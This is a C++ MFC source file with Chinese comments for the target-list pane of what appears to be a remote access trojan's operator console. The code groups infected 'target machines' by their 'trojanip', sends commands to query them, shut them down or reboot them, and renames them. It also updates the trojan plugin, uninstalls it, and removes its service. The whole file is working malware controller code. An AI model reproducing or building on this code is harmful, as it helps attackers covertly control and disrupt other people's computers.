// ObjViewPane.cpp: implementation of the CObjViewPane class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ObjViewPane.h"
#include "macro.h"
#include <process.h>

using namespace std;

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

#ifdef WINVER				// Allow use of features specific to Windows 95 and Windows NT 4 or later.
#undef WINVER
#define WINVER 0x0501		// Change this to the appropriate value to target Windows 98 and Windows 2000 or later.
#endif

#ifdef _WIN32_WINNT		// Allow use of features specific to Windows NT 4 or later.
#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0501		// Change this to the appropriate value to target Windows 98 and Windows 2000 or later.
#endif						

#ifdef _WIN32_WINDOWS		// Allow use of features specific to Windows 98 or later.
#undef _WIN32_WINDOWS
#define _WIN32_WINDOWS 0x0501 // Change this to the appropriate value to target Windows Me or later.
#endif

#ifdef _WIN32_IE			// Allow use of features specific to IE 4.0 or later.
#undef _WIN32_IE
#define _WIN32_IE 0x0600	// Change this to the appropriate value to target IE 5.0 or later.
#endif

#include "XTSuitePro.h"
#include <map>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define ID_TREECTRL 0xFF
#define ID_SVR_SELFDEL 12035

static map<int, vector<HTREEITEM> > groupItem;
static map<int, HTREEITEM> groupHeadItem;
const int GROUPITEMCNT = 10;

CObjViewPane::CObjViewPane()
{
	m_iGroupData = 0;
	m_iObjData = MIN_LEAF_NODE;
	m_iTempObj = 0;
	m_hItemNew = NULL;
	m_hItemOld = NULL;
	m_hSelfDeleteThread = NULL;
	m_dwSelfDeleteThreadId = 0;
}

CObjViewPane::~CObjViewPane()
{

}

BEGIN_MESSAGE_MAP(CObjViewPane, CWnd)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_NOTIFY(TVN_SELCHANGED, ID_TREECTRL, OnSelchangedTree)
	ON_NOTIFY(NM_RCLICK, ID_TREECTRL, OnRclickWorkTree)
	ON_COMMAND(ID_MENU_OBJ_INFO,OnGetObjMachineInfo)
	ON_COMMAND(ID_MENU_SHUTDOWN, OnShutdownObjMachine)
	ON_COMMAND(ID_MENU_REBOOT, OnRebootObjMachine)
	ON_COMMAND(ID_MENU_RENAME_OBJ, OnRenameObjMachine)
#ifndef TRIVAL
	ON_COMMAND(ID_MENU_UPDATE, OnUpdatePlugin)
	ON_COMMAND(ID_MENU_UNLOAD, OnUnloadPlugin)
	ON_COMMAND(ID_MENU_REMOVE, OnRemoveService)
#endif
END_MESSAGE_MAP()


/////////////////////////////////////////////////////////////////////////////
// CObjViewPane message handlers


BOOL CObjViewPane::CreateImageList(CImageList& il, UINT nID)
{
	if (!il.Create(16, 16, ILC_MASK|ILC_COLOR24, 0, 1))
		return FALSE;
	
	//ISite::LoadMyBitmap(il, nID, 16, 16);
	
	CBitmap bmp;
	VERIFY(bmp.LoadBitmap(nID));
	il.Add(&bmp, CXTPImageManager::GetBitmapMaskColor(bmp, CPoint(0, 0)));
	
	return TRUE;
}

int CObjViewPane::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	if (m_wndObjView.GetSafeHwnd() == 0)
	{
		if (!m_wndObjView.Create(WS_VISIBLE | TVS_HASLINES | TVS_LINESATROOT | TVS_HASBUTTONS | TVS_SHOWSELALWAYS,
			CRect(0,0,0,0), this, ID_TREECTRL ))
		{
			TRACE0( "Unable to create tree control.\n" );
			return 0;
		}
		m_wndObjView.ModifyStyleEx(0, WS_EX_STATICEDGE);

		if (!CreateImageList(m_ilClassView, IDB_OBJTREE))
			return 0;

		m_Font.CreateFont( 12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, 
			CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,  DEFAULT_PITCH | FF_SWISS, "宋体");              

		m_wndObjView.SetFont( &m_Font );

		// Set the image list for the tree control.
		m_wndObjView.SetImageList( &m_ilClassView, TVSIL_NORMAL );

		// Add the parent item
		m_root = m_wndObjView.InsertItem("目标机列表", 0, 1 );
		m_wndObjView.SetItemState( m_root, TVIS_BOLD, TVIS_BOLD );
		m_wndObjView.Expand(m_root, TVE_EXPAND);
	}

	return 0;
}

void CObjViewPane::OnSize(UINT nType, int cx, int cy)
{
	CWnd::OnSize(nType, cx, cy);

	int nTop = 0;
	if (m_wndObjView.GetSafeHwnd())
		m_wndObjView.MoveWindow(0, nTop, cx, cy - nTop);
}

/***************************************************
*功能：根据目标机的选择改变做出响应
*说明：
***************************************************/
void CObjViewPane::OnSelchangedTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	m_hItemNew = pNMTreeView->itemNew.hItem;
	m_hItemOld = pNMTreeView->itemOld.hItem;

	int iNew=0, iOld=0;
	iNew = m_wndObjView.GetItemData(m_hItemNew);
	
	if(m_hItemOld != NULL)
		iOld = m_wndObjView.GetItemData(m_hItemOld);

	//光标从目标机移动到目标机或光标从组移动到目标机
	//给每个插件发送信息，从而每个插件获得当前的目标机的信息
	if( ((iNew != iOld) && (iNew >= MIN_LEAF_NODE) && (iOld>=MIN_LEAF_NODE)) ||
		((iNew>=MIN_LEAF_NODE) && (iOld<MIN_LEAF_NODE) && (iNew!= m_iTempObj)) )
	{
		ISite::Service(ZCM_SEL_OBJ, (WPARAM)&iNew, NULL);
	}
	//光标从目标机移动到组,记录光标以前的位置
	else if( (iNew<MIN_LEAF_NODE) && ( iOld>=MIN_LEAF_NODE) )
		 m_iTempObj = iOld;
	
	*pResult = 0;
}

void CObjViewPane::OnRclickWorkTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	HTREEITEM hItem = m_wndObjView.GetSelectedItem();
	int iTreeNodeData = m_wndObjView.GetItemData(hItem);

	if( iTreeNodeData>=MIN_LEAF_NODE )
	{
		CMenu menu;
		CPoint pt;
		GetCursorPos(&pt);			
		menu.LoadMenu(IDR_MENU_OBJ);		
		//ISite::Notify(ZCM_WM_R_MENU,(WPARAM)menu.GetSubMenu(0),NULL);
		//menu.GetSubMenu(0)->AppendMenu( MF_STRING,ID_SVR_SELFDEL, "删除服务器");
		menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, this, NULL);
	}
}


/************************************************************************/
/* 寻找目标机可用的组，如果一个组满员，则新开另一个新组                 */
/************************************************************************/
int CObjViewPane::FindGroup()
{
	//寻找当前所有组中未满的一个组
	for(int thisGroup = 0; thisGroup <= m_iGroupData; thisGroup++)
	{
		KDebug("group %d item %d", thisGroup, groupItem[thisGroup].size());
		if(groupHeadItem[thisGroup] && groupItem[thisGroup].size() < GROUPITEMCNT)
			return thisGroup;
	}

	//新开一个组
	CString text;
	text.Format("第%d组", m_iGroupData+1);
	HTREEITEM hti = m_wndObjView.InsertItem(text, 6, 6, m_root);
	m_wndObjView.SetItemData(hti, m_iGroupData);
	groupHeadItem[m_iGroupData] = hti;
	m_wndObjView.Expand(m_root, TVE_EXPAND);

	return m_iGroupData++;
}

/************************************************************************/
/* 新增一个树形节点                                                      */
/************************************************************************/
HTREEITEM CObjViewPane::InsertItem(STANDARDDATA* info)
{
	CString text = ISite::GetRealAddr(info);
	if(text.IsEmpty())	text = info->trojanip;
	text = CString(info->dllInfo) + "-" + text;
	
	int iGroup = FindGroup();
	m_hti = groupHeadItem[iGroup];	
	HTREEITEM hti = m_wndObjView.InsertItem(text, 4, 2, m_hti);
	if(!hti)	return NULL;

	m_wndObjView.SetItemData(hti, info->iData);
	groupItem[iGroup].push_back(hti);
	m_wndObjView.Expand(m_hti, TVE_EXPAND);

	return hti;
}

int CObjViewPane::ChangeText(STANDARDDATA* info)
{
	CString text = ISite::GetRealAddr(info);
	if(text.IsEmpty())	text = info->trojanip;
	text = CString(info->dllInfo) + "-" + text;
	
	HTREEITEM hItem = m_wndObjView.FindItem(m_root, info->iData);
	if(hItem == NULL)	return -1;

	m_wndObjView.SetItemText(hItem, text);
	return 0;
}

/************************************************************************/
/* 移除一个树形节点		                                                 */
/************************************************************************/
int CObjViewPane::RemoveItem(STANDARDDATA *info)
{
	KDebug("Remove %d", info->iData);

	HTREEITEM hItem = m_wndObjView.FindItem(m_root, info->iData);
	if(hItem == NULL)	return -1;

	//首先删除树形节点所在组的节点信息
	HTREEITEM pItem = m_wndObjView.GetParentItem(hItem);
	if(pItem)
	{
		for(int i = 0; i < m_iGroupData; i++)
		{
			if(groupHeadItem[i] == pItem)
			{
				for(vector<HTREEITEM>::iterator it = groupItem[i].begin(); it != groupItem[i].end(); it++)
				{
					if(*it == hItem)
					{
						groupItem[i].erase(it);
						break;
					}
				}
			}
		}
	}

	//删除节点值
	m_wndObjView.DeleteItem(hItem);
	return 0;
}


//////////////////////////////////////////////////////////////////////////
///****功能说明： 获取最近被选中的叶子结点的值////////////////////////////
///****返回 值 :  叶子结点的值,如果小于MIN_LEAF_NODE则为非叶子结点////////
///****注   意 :  通常返回值为叶子结点,因为两次选中非叶子结点的情况不被记/
///*************  录,具体情况参考CObjViewPane中的OnselchangedTree函数/////
int CObjViewPane::GetValidObjData()
{
	int	iDataNew = 0;		
	int	iDataOld = 0;
	HTREEITEM hItemNew = m_hItemNew;
	HTREEITEM hItemOld = m_hItemOld;
	if(hItemNew != NULL)
		iDataNew = m_wndObjView.GetItemData(hItemNew);
	if(hItemOld != NULL)
		iDataOld = m_wndObjView.GetItemData(hItemOld);
	if(iDataNew >= MIN_LEAF_NODE)
		return iDataNew;
	return iDataOld;
}

void CObjViewPane::OnGetObjMachineInfo()
{
	ISite::SendCmd(CONTROL_QUERY_INFO, g_StandardData.s);
}


void CObjViewPane::OnShutdownObjMachine()
{
	if(MessageBox("确定关闭这台计算机？","", MB_OKCANCEL|MB_ICONQUESTION) == IDOK)
		ISite::SendCmd(CONTROL_SHUTDOWN_SYSTEM, g_StandardData.s);
}

void CObjViewPane::OnRebootObjMachine()
{
	if(MessageBox("确定重启这台计算机？", "", MB_OKCANCEL|MB_ICONQUESTION) == IDOK)
		ISite::SendCmd(CONTROL_RESTART_SYSTEM, g_StandardData.s);
}

class CMyRenameDlg : public CDialog
{
	DECLARE_DYNAMIC(CMyRenameDlg)

public:
	CMyRenameDlg(CWnd* pParent = NULL):CDialog(CMyRenameDlg::IDD, pParent), filename(_T(""))
	{
	}
	
	virtual ~CMyRenameDlg(){}

	enum { IDD = IDD_DIALOG2_RENAME };

	virtual BOOL OnInitDialog()
	{
		return CDialog::OnInitDialog();
	}

	CString GetFileName()const {return filename;}

protected:
	virtual void DoDataExchange(CDataExchange* pDX)    // DDX/DDV 支持
	{
		CDialog::DoDataExchange(pDX);
		DDX_Text(pDX, IDC_EDIT_VALUE, filename);
		DDV_MaxChars(pDX, filename, 250);
	}

	DECLARE_MESSAGE_MAP()

private:
	CString filename;
};

IMPLEMENT_DYNAMIC(CMyRenameDlg, CDialog)

BEGIN_MESSAGE_MAP(CMyRenameDlg, CDialog)
END_MESSAGE_MAP()

void CObjViewPane::OnRenameObjMachine()
{
	CMyRenameDlg dlg;
	if(dlg.DoModal() == IDOK)
	{
		const char* name = dlg.GetFileName();
		ISite::SendCmd(CONTROL_CHANGE_TEXT, g_StandardData.s, (char*)name, strlen(name)+1);

		HTREEITEM hItem = m_wndObjView.GetSelectedItem();
		if(hItem)	m_wndObjView.SetItemText(hItem, name);
	}
}

void CObjViewPane::OnUpdatePlugin()
{
	ISite::Service(ZCM_UPDATE_TROJAN, 1, NULL);
}

void CObjViewPane::OnUnloadPlugin()
{
	ISite::SendCmd(CONTROL_UNINSTALL, g_StandardData.s);
}

void CObjViewPane::OnRemoveService()
{
	ISite::SendCmd(CONTROL_REMOVE, g_StandardData.s);
}
